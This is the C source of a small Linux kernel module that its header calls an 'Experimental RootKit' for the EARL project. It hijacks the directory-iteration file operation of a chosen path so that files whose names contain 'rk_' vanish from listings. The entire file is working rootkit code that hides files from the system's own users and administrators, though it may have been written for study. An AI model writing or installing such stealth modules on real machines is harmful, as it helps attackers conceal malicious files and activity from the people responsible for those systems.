/*
 * Experimental RootKit
 * Simple RootKit for the EARL project
 * Functionality : Hiding files starting witk "rk_"
 */

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>

#include <linux/proc_fs.h>

static int __init fhide_init(void);
static void __exit fhide_exit(void);

module_init(fhide_init);
module_exit(fhide_exit);

static char *prefix = "rk_";
module_param(prefix, charp, S_IRUGO);

static char *kpath = "/";
module_param(kpath, charp, S_IRUGO);

struct file_operations proc_fops;
const struct file_operations *backup_proc_fops;
struct inode *proc_inode;

struct dir_context *backup_ctx;

static int rk_filldir_t(struct dir_context *ctx, const char *file_name, int len,
        loff_t off, u64 ino, unsigned int d_type)
{
    if (strstr(file_name, prefix) != NULL)
        return 0;

    return backup_ctx->actor(backup_ctx, file_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

static int __init fhide_init(void)
{
    printk(KERN_INFO "FHide: LKM succesfully loaded!\n");
    struct path p;

    if(kern_path(kpath, 0, &p))
        return 0;

    proc_inode = p.dentry->d_inode;

    proc_fops = *proc_inode->i_fop;
    backup_proc_fops = proc_inode->i_fop;
    proc_fops.iterate_shared = rk_iterate_shared;
    proc_inode->i_fop = &proc_fops;

    return 0;
}

static void __exit fhide_exit(void)
{
    struct path p;
    struct inode *proc_inode;
    if(kern_path(kpath, 0, &p))
        return;
    proc_inode = p.dentry->d_inode;
    proc_inode->i_fop = backup_proc_fops;

    printk(KERN_INFO "FHide: LKM succesfully unloaded!\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yassine Tioual");
MODULE_VERSION("0.1");
